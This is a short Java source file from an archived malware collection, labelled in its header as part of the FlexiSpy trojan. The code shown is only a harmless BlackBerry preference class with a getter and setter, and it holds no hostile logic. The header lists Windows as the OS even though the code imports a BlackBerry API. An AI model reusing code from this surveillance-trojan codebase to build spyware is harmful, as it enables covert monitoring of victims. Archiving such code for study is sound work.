/*
  name      FlexiSpy
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    RamadhanAmizudin/malware
  archived  RamadhanAmizudin, krisyotam (2026)
  notes     —
 */
package com.vvt.pref;

import net.rim.device.api.util.Persistable;

public class PrefInfo implements Persistable {
	
	private PreferenceType prefType = PreferenceType.PREF_UNKNOWN;
	
	public PreferenceType getPrefType() {
		return prefType;
	}
	
	protected void setPrefType(PreferenceType prefType) {
		this.prefType = prefType;
	}
}